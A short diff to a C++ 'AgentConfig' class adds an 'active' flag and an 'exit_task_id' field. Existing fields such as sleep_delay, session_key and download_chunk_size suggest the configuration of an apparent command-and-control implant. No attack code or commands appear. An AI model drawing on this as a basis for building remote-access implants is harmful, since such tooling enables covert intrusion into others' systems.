@@ -5,8 +5,11 @@
 class AgentConfig
 {
 public:
+	bool active;
+
 	DWORD agent_type;
 	BYTE  exit_method;
+	ULONG exit_task_id;
 	DWORD download_chunk_size;
 	PBYTE session_key;
 	DWORD sleep_delay;
